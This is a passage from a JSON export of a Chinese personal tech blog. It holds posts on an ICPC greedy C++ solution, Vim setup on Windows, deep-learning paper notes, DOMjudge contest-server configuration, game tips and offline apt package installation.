中总会合并成一段，根据这一性质在原数组中利用单调栈即可构造初始的段，之后就是从数组 $A,B​$ 贪心选择均值较大的段。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;bits/stdc++.h&gt;using namespace std;typedef double db;typedef long long ll;typedef vector&lt;int&gt; vi;typedef pair&lt;int, int&gt; pii;#define fi first#define se second#define pb push_back#define sz(x) ((int)(x).size())#define all(x) begin(x),end(x)#define rep(i,l,r) for(int i=(l);i&lt;(r);++i)#define per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)#define dd(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; \", \"#define de(x) cout &lt;&lt; #x &lt;&lt; \"=\" &lt;&lt; x &lt;&lt; endl//-------const int N = 1e5 + 7;int n, m, A[N], B[N];struct Node &#123; int num; ll sum; Node() &#123;&#125; Node(int _num, ll _sum) &#123; num = _num, sum = _sum; &#125; Node operator+(const Node &amp;p) const &#123; return Node(num + p.num, sum + p.sum); &#125; bool operator&lt;(const Node &amp;p) const &#123; return sum * p.num &lt; p.sum * num; &#125;&#125; a[N], b[N];int gao(int n, int *r, Node *a) &#123; int top = 0; rep(i, 0, n) &#123; scanf(\"%d\", r + i); Node v(1, r[i]); while (top &gt; 0 &amp;&amp; a[top - 1] &lt; v) v = a[--top] + v; a[top++] = v; &#125; return top;&#125;int main() &#123; scanf(\"%d%d\", &amp;n, &amp;m); int la = gao(n, A, a), lb = gao(m, B, b); n = m = 0; ll ans = 0; for (int i = 0, j = 0; i &lt; la || j &lt; lb; ) &#123; while (i &lt; la &amp;&amp; (j == lb || !(a[i] &lt; b[j]))) &#123; rep(k, n, n + a[i].num) ans += 1ll * (k + m + 1) * A[k]; n += a[i++].num; &#125; while (j &lt; lb &amp;&amp; (i == la || !(b[j] &lt; a[i]))) &#123; rep(k, m, m + b[j].num) ans += 1ll * (k + n + 1) * B[k]; m += b[j++].num; &#125; &#125; printf(\"%lld\\n\", ans); return 0;&#125;","categories":[],"tags":[{"name":"ICPC","slug":"ICPC","permalink":"http://mcginn7.github.io/tags/ICPC/"},{"name":"贪心","slug":"贪心","permalink":"http://mcginn7.github.io/tags/贪心/"}]},{"title":"Windows 下使用 Vim","slug":"Vim-for-windows-配置","date":"2018-10-10T13:18:19.537Z","updated":"2019-07-29T13:15:07.000Z","comments":true,"path":"2018/10/10/Vim-for-windows-配置/","link":"","permalink":"http://mcginn7.github.io/2018/10/10/Vim-for-windows-配置/","excerpt":"","text":"简要说明主要针对 ACM/ICPC 竞赛选手在 Windows 10 系统下使用 vim 编写 C/C++ 代码。 功能配置： 编译和运行 *.cpp 文件； 一键复制代码; 记事本打开代码。 git bash 和 gvim 都配置了一遍。gvim 使用 Windows 自带的 cmd 运行的话，鼠标是没办法移动光标的，并且配置相对 git bash 较麻烦，所以推荐使用 git bash。 Vimrc 配置 编辑安装路径下的 vimrc 文件，例如 “D:\\Git\\etc\\vimrc”，配置快捷键。 123456set nu ai ci si mouse=a ts=4 sts=4 sw=4nmap&lt;F2&gt; :vs %&lt;.in &lt;CR&gt;nmap&lt;F3&gt; :w !clip.exe &lt;CR&gt; &lt;CR&gt;nmap&lt;F4&gt; :!write % &lt;CR&gt;nmap&lt;F8&gt; :!./%&lt; &lt; %&lt;.in &lt;CR&gt;nmap&lt;F9&gt; :!g++ % -o %&lt; -O2 -g -Wall -std=c++11 &lt;CR&gt; 额外配置 vimrc 文件默认有一些配置，可根据需要修改。 123set vb \"这个不关的话，触发某些条件会闪屏set laststatus=1 \"窗口底部状态栏的行数（默认是2），这里设置成1。au FileType c,cpp setlocal comments-=:// comments+=f:// \"取消换行自动注释 设置 Ctrl + Alt + T 快捷键启动 Git Bash 终端。 创建 “git-bash.exe” 的快捷方式，打开快捷方式的属性窗口，修改起始位置，并设置快捷键。 打开控制面板，找到 “管理工具”， 将快捷方式复制到该文件夹中。","categories":[],"tags":[{"name":"vim","slug":"vim","permalink":"http://mcginn7.github.io/tags/vim/"},{"name":"git bash","slug":"git-bash","permalink":"http://mcginn7.github.io/tags/git-bash/"}]},{"title":"论文笔记 Tips and Tricks for Visual Question Answering","slug":"论文笔记-Tips-and-Tricks-for-Visual-Question-Answering","date":"2018-10-09T03:24:19.000Z","updated":"2018-11-12T03:27:34.000Z","comments":true,"path":"2018/10/09/论文笔记-Tips-and-Tricks-for-Visual-Question-Answering/","link":"","permalink":"http://mcginn7.github.io/2018/10/09/论文笔记-Tips-and-Tricks-for-Visual-Question-Answering/","excerpt":"","text":"简介​ 该论文作者取得了 2017 VQA Challenge 的第一，总结一些 tips 和 tricks 来提升 VQA 的表现。 ​ 这篇论文的每个实验使用不同的随机种子重复3次实验来统计结果。 模型 一些细节 所有问题的长度固定 14。 问题特征 $q$ 与图像特征 $\\hat v$ 的融合使用 Hadamard product（逐项相乘）。 h = f_q(q) \\circ f_v(\\hat v) 目标函数（损失函数） L=-\\sum_i^M\\sum_j^N s_{ij}\\log (\\hat s_{ij})-(1-s_{ij})\\log(1-\\hat s_{ij}) 作者使用了额外的数据集 Visual Genome(VG)，共 485,000。 关键点Sigmoid output 输出使用 sigmoid 将每个类别（或答案）归一化。 softmax 也可以用来归一化，但是会变成单个类别输出，而 sigmoid 可以输出多个类。这样可以适应一个问题有多个答案的情况。 Soft scores as ground truth targets VQA 中问题答案附有置信度，将答案向量化有 2 种做法：1）使用固定阈值将答案二值化；2）使用 sigmoid 或 softmax 来归一化答案。 做法1）就是 hard scores，每个类只有 0、1 两个选项。做法2）就是 soft scores，每个类都有一个浮点数的得分。 作者使用了两个简单的二值化进行对比 s'_{ij}=(s_{ij}>0.0) \\\\ s'_{ij}=(s_{ij}==1.0) Gated tanh activations 使用 gated tanh activations 作为激活函数，而不是常用的 Rectified Linear Unit（ReLU）。 激活函数 $f_a: x \\in R^m \\rightarrow y \\in R^n$ \\tilde y = tanh(Wx + b) \\\\ g = \\sigma(W'x+b') \\\\ y = \\tilde y \\circ g$W,W’,b,b’$ 为训练参数，$\\circ$ 表示 Hadamard product（逐项相乘）。 该激活函数之前被用于自然语言处理。 Bottom up attention 使用 bottom up attention 来提取图像特征，而不是直接使用 CNN 的特征层（feature map）。 Bottom up attention 基于 Faster R-CNN 框架，提取若干 Region of Interest（RoI）的特征，继而通过非线性层做 attention。论文里使用阈值来筛选出 $K$ 个 RoI 并设置了 100 的上限（作者将数量 $K$ 固定为 36，表现会差一些，但是减少了计算开销）。 Attention 的非线性层 a_i=w_af_a(v_i, q) \\\\ \\alpha = softmax(a) \\\\ \\hat v = sum_{i=1}^K \\alpha_i v_i$q$ 为问题表示向量，$v_i$ 为 RoI 的特征向量。 使用 bottom up attention 相对于传统的 CNN 提取特征，提升是很明显的。 Pretrained representations to initialize 论文提出了加入先验知识 $w_o^{text}$ 和 $w_o^{img}$ 来初始化输出层参数 \\hat s = \\sigma(w_o^{text}f_o^{text}(h)+w_o^{img}f_o^{img}(h)) $w_o^{text}$ 使用 GloVe word embedding 初始化。 $w_o^{img}$ 使用谷歌图片搜索 10 张对应图片并用 ResNet-10 提取特征，10 个特征向量均值化得到最终的向量表示。 这个做法提升了大约 0.87 个点。 Larger mini-batches 通常来说，mini-batches 越大效果越好，但是大到一定程度后就不会有明显提升了，训练速度会慢。 Smart shufﬂing batch 通常从数据中随机抽取。针对 VQA 这个问题来说，同个问题关联到不同图像会得到不一样的答案（balanced pair），所以作者提出了 smart shuffling 控制 balanced pair 的比例。 这个做法 VQA 得分与随机做法差不多，但是提升了 Accuracy over paris。","categories":[],"tags":[]},{"title":"DOMjudge 配置","slug":"DOMjudge配置","date":"2018-10-04T15:29:36.000Z","updated":"2019-05-21T07:05:41.000Z","comments":true,"path":"2018/10/04/DOMjudge配置/","link":"","permalink":"http://mcginn7.github.io/2018/10/04/DOMjudge配置/","excerpt":"","text":"Domserver 部署PHP timezone php.ini 文件位置 CentOS/RedHat/Fedora = /etc/php.ini Ubuntu/Debian/LinuxMint = /etc/php5/apache2/php.ini 选择时区，通常定位为 “Asia/Shanghai” PHP: List of Supported Timezones 编辑 php.ini 文件 1date.timezone = \"Asia/Shanghai\" 重启 Apache Service。 1sudo service apache2 restart MySQL maximum connections原先编辑 \\etc\\mysql\\my.cnf 添加 max_connections = 1000，然后重启 apache2 即可。但是设置后一直为 214，因为该值受限于 table_open_ache 和 open_files_limit。 下面的方法在 Ubuntu 16.04 和 MySQL 5.7.23 版本实验成功： 运行下面的命令，设置 open_files_limit 1systemctl edit mysql 输入以下内容 12[Service]LimitNOFILE=8000 重启服务 12systemctl daemon-reloadsystemctl restart mysql 数据导入测试数据导入在 Problems 页面下可以编辑 Problem name, Time limit 这些信息，测试数据（Testcases）在页面上只能单点添加和修改，并且不能删除。 批量导入测试数据步骤： 先添加题目，填入”Problem name”、”Time limit” 和 “Memory limit” 等信息，其余的保存默认即可，但是暂不添加 “Testcases”。 点击该题目的导出按钮，下载得到一个压缩包。解压后的文件夹内容如下： 12345678910// 在Windows使用 tree/f 生成该目录文本信息│ domjudge-problem.ini│ problem.yaml│├─data│ ├─sample│ └─secret│└─problem_statement problem.pdf 目录 sample 和 secret 可自行创建，两个目录存放样例数据和隐藏数据（即测试数据）。 将数据 “0.in”，“0.ans” 放入对应的文件夹下，重新压缩成新的压缩包。 在题目的编辑页面，通过 Upload problem archive 上传新压缩包。注意 Contest 选项选择为 Do not add / update contest data，否则可能会上传失败。 队伍账号导入 Domjudge队伍导入 - 参考链接 需要在 home &gt; import / export 页面下，导入 teams.tsv 和 accounts.tsv 这两个文件。在编辑这两个文件时，需要使用 UTF-8 格式，否则会上传失败或导致乱码。 teams.tsv 该文件用于描述队伍信息，包含一版本行，接着每个队伍占用一行，每行包括用制表符（tab）分隔的字段。 首行为版本行，格式如下： FieldDescriptionExampleType1Labelteamsfixed string (always same value)2Version number1integer 队伍描述行，格式如下： FieldDescriptionExampleType1Team Number22integer2External ID24314integer3Group ID3integer4Team nameHoosstring5Institution nameFuzhou Universitystring6Institution short nameFZUstring7Country CodeCHNstring ISO 3166-1 alpha-3 8Affiliation External IDFuzhou Universitystring Group ID 对应 Categories 中的 ID，表示队伍的角色，如女队、打星队等。 accounts.tsv 该文件用于描述账号信息，同样包含版本行和账号行，每个账号占用一行。 首行版本行的格式如下： FieldDescriptionExampleType1Labelaccountsfixed string (always same value)2Version number1integer 账号描述行的格式如下： FieldDescriptionExampleType1Account Typeteamstring2Full Namewtfstring3Usernameteam099string4PasswordB!5MWJiystring Account Type 取值为：team, judge, admin, analyst。这里要导入队伍账号，所以该字段在这固定为 team。 注意：需要设置 Username 的格式才能将账号和队伍关联起来，规则为：Username 的整数部分需要和 team.tsv 中的 Team Number 一致。比如一支队伍 Team Number 为 99，则 Username 可以设置为 team-099。 导入样例 team.tsv 文件 1234teams 18 team008 3 三核战队 福州大学 FZDX CHN 福州大学18 team018 3 挂机不队 福州大学 FZDX CHN 福州大学31 team031 3 这都是什么鬼 福州大学 FZDX CHN 福州大学 accounts.tsv 文件 1234accounts 1team 三核战队 team008 T3yRt3team 挂机不队 team018 86MFyBteam 这都是什么鬼 team031 RTJr6e 评测机Unprivileged user and group1234// 下面这条命令是必须运行的useradd -d /nonexistent -U -M -s /bin/false domjudge-run// X=1~4，X通常等同于CPU核心数useradd -d /nonexistent -U -M -s /bin/false domjudge-run-X Linux Control Groups 每次重启都需要运行 judgehost/bin/create_cgroups，否则提交会编译错误。 问题集锦1. 比赛正常需要几台机器？个人认为正常应该至少需要 4 台机器，配置较高的作为主服务器，即 DOMserver，提供比赛的 web 页面；一台打印服务器，也安装 DOMserver，但开放 print 页面，达到比赛与打印分开，减少宕机对选手的影响；两台评测机，即 Judgehost，这样如果一台宕机，也有另一台继续评测，而不是完全中断评测，并且修复后可随时上线新的评测机。 由于安装的机器较多且安装包大，建议使用 apt-offline 打包需要的安装包，节省安装时间。 2. 气球状态页面返回 500 错误正式比赛开始时，contest 只能留有一个比赛。（个人不知道原因）。 3. 测试数据上传失败可能需要修改的几个文件： /etc/apache2/conf-avaliable/domjudge.conf 123456&lt;IfModule mod_php7.c&gt;php_value max_file_uploads 101php_value upload_max_filesize 128Mphp_value post_max_size 128Mphp_value memory_limit 512M&lt;/IfModule&gt; /etc/mysql/my.cnf 1234[mysqld]max_connections = 10000max_allowed_packet = 512Minnodb_log_file_size = 512M 4. 如何让 DOMJudge 支持多台打印机？修改 domserver/webapp/src/DOMJudgeBundle/Utils/Printing.php 中 cmd 指令： 1234567$cmd = \"enscript -C \" . $highlight . \" -d \" . $printername // 指定打印机名 . \" -b \" . escapeshellarg($header) . \" -a 0-10 \" . \" -f Courier9 \"// . \" -p $tmp \" . escapeshellarg($filename) . \" 2&gt;&amp;1\"; 去除 -p $tmp ，添加 -d 参数，指定打印机打印。多台打印机则让打印机名轮转即可。","categories":[],"tags":[{"name":"domjudge","slug":"domjudge","permalink":"http://mcginn7.github.io/tags/domjudge/"}]},{"title":"论文笔记 Semantic Compositional Networks for Visual Captioning","slug":"论文笔记 Semantic Compositional Networks for Visual Captioning","date":"2018-08-18T12:58:18.000Z","updated":"2018-10-08T12:55:41.000Z","comments":true,"path":"2018/08/18/论文笔记 Semantic Compositional Networks for Visual Captioning/","link":"","permalink":"http://mcginn7.github.io/2018/08/18/论文笔记 Semantic Compositional Networks for Visual Captioning/","excerpt":"","text":"简介​ 该论文提出了语义组合网络(Semantic Compositional Network, SCN)，其有效利用语义概念（标签）来达到效果比较好的图文生成。 Semantic compositional networks 模型基础 使用CNN提取图像特征，RNN作文字生成。 文字生成的概率公式： p(\\bold X | \\bold I) = \\prod _{t=1}^Tp(x_t|x_0, \\dots , x_{t-1}, v) $ \\bold X = (x_1, \\dots , x_T)$ 表示文字序列，$v$ 为提取的图像特征。 LSTM的转换函数： h_t = \\sigma(Wx_{t-1}+Uh_{t-1}+\\mathbb{1}(t=1)\\cdot Cv)​ 图像特征仅在开始输入一次。 语义概念检测 作者将语义标签检测作为多标签分类问题。 首先先从训练集的文字说明中提取常见的 $K \\approx 1000$个单词作为分类标签 $y_i = [y_{i1}，\\dots，y_{iK}] \\in \\{0, 1\\}^K$。 标签$s_i$使用MLP来预测(Ps：这里可能是在CNN的基础上加入MLP)， s_i = \\sigma(MLP(v_i))$s_i$表示每个标签的概率，也可以理解为权重。 优化目标函数： \\frac 1N\\sum_{i=1}^N \\sum_{k=1}^K {(y_{ik}\\log s_{ik}+(1-y_{ik}\\log(1-s_{ik})))} SCN-RNN 这一步就是将语义标签嵌入到RNN中。 嵌入相关公式： \\hat x_{t-1}=W_bs\\bigodot W_cx_{t-1} \\\\ \\hat h_{t-1} = U_bs\\bigodot U_ch_{t-1} \\\\ z=\\mathbb{1}(t=1)\\cdot Cv \\\\ h_t = \\sigma(W_a\\hat x_{t-1} + U_a\\hat h_{t-1} + z) 视频文字生成(video caption) 视频的图像特征包括两部分：均值池化2D CNN提取的图像特征和3D CNN提取的特征，两个特征连接起来作为视频的图像特征。 结果 在数据集COCO和Youtube2Text的各个评估指标全面提升。","categories":[],"tags":[]},{"title":"The Binding of Isaac:Afterbirth+总结","slug":"The Binding of Isaac Afterbirth+总结","date":"2018-07-19T07:02:03.000Z","updated":"2018-07-21T07:20:04.000Z","comments":true,"path":"2018/07/19/The Binding of Isaac Afterbirth+总结/","link":"","permalink":"http://mcginn7.github.io/2018/07/19/The Binding of Isaac Afterbirth+总结/","excerpt":"","text":"献血袋：扣半颗红心（子宫层一颗），掉落随机数量（通常1）的硬币。献血袋很强，很容易刷起来。 手术刀：在地上制造褐色和蓝色两个通道并传送，传送出来时有短暂无敌，可以做到： 白嫖卖血机，喂黑小孩，进出刺房等； 进BOSS房和挑战房时，开箱子后直接传出去。 在白心的隐藏房，使用存血罐可以吐出白心。配合1+1和肉刀可以生成N多肉哥。 钥匙通常留给商店使用。 睫毛膏是负面道具，不要拿。 商店高概率刷出复眼（复制本房间的道具，未购买的道具也可以复制），最好等出了打折券再用。 20分钟内打败妈腿会开Boss Rush房；30分钟内打败妈心开启Blue Womb(蓝色子宫，打hush)房。使用MaMa Mega!可以强制开启br和bw。","categories":[],"tags":[]},{"title":"论文阅读记录","slug":"论文阅读记录","date":"2018-07-17T02:33:16.000Z","updated":"2018-07-17T02:57:19.000Z","comments":true,"path":"2018/07/17/论文阅读记录/","link":"","permalink":"http://mcginn7.github.io/2018/07/17/论文阅读记录/","excerpt":"","text":"2014 Generative Adversarial Networks An Annotated Proof of Generative Adversarial Networks with Implementation Notes Conditional Generative Adversarial Nets 2016 Conditional Image Synthesis With Auxiliary Classifier GANs InfoGAN: Interpretable Representation Learning by Information Maximizing Generative Adversarial Nets 2017 Wasserstein GAN 令人拍案叫绝的Wasserstein GAN Improved Training of Wasserstein GANs","categories":[],"tags":[]},{"title":"Ubuntu离线安装软件包","slug":"apt-offline管理Ubuntu离线安装软件包","date":"2018-06-05T11:27:37.000Z","updated":"2018-06-06T06:26:39.000Z","comments":true,"path":"2018/06/05/apt-offline管理Ubuntu离线安装软件包/","link":"","permalink":"http://mcginn7.github.io/2018/06/05/apt-offline管理Ubuntu离线安装软件包/","excerpt":"","text":"参考链接 apt-offline离线安装指南 https://blog.sleeplessbeastie.eu/2014/01/30/how-to-manage-packages-on-an-off-line-debian-system/ http://manpages.ubuntu.com/manpages/precise/man8/apt-offline.8.html#contenttoc4 https://www.debian.org/ https://camicri.github.io/camicri-cube/#/ 应用场景 需要升级/安装软件的电脑无网络。 软件要安装到多台电脑上，且软件较大，下载时间长。 方案 由于apt-offline的安装有依赖，离线安装会失败，所以需要借助Camicri Cube来完成apt-offline的安装。 不用Camicri Cube完成全部安装是因为它貌似不支持命令行，只有可视化界面操作。如果安装的包较多，就比较麻烦。而apt-offline支持命令行操作，一次性可以打包多个安装包，比较方便。 Camicri Cube完成离线系统升级 在离线电脑上打开Camicri Cube，创建一个project，关闭后打包Cube目录下相应的project。 在联网电脑上，将打包文件解压到Cube目录下的project目录，然后用Cube打开这个project。 点击 Cube -&gt; Repository -&gt; Download Repositories 进行下载更新。 点击 Asterisk -&gt; Upgradable ， Cube -&gt; Download -&gt; Mark All Updates for Download ， Cube -&gt; Download -&gt; Download All Marked Packages ，就可以完成软件包的升级。 在上方的搜索框输入apt-offline和vim，点download进行下载。 在联网电脑的project打包后传到离线电脑上，覆盖原先的project，然后用Cube打开。 Cube -&gt; System -&gt; Update Computer’s Repositories 更新Repository。 Cube -&gt; Install -&gt; Mark All Downloaded for Installation , Cube -&gt; Install -&gt; Install All Marked Packages ，完成安装软件。 apt-offline下载及安装离线软件包 假设要在离线电脑安装mysql-server，先在离线电脑运行以下命令来，完成安装包的行为和定义签名文件： 1apt-offline set debian-install.sig --install-packages mysql-server 将生成的debian-install.sig文件上传到联网电脑执行下载并打包： 1apt-offline get debian-install.sig --bundle debian-install.zip 将打包好的debian-install.zip传到离线电脑上，运行下面的命令来更新APT database: 1sudo apt-offline install debian-install.zip 最后运行apt-get来完成安装： 1sudo apt-get install mysql-server","categories":[],"tags":[]}]}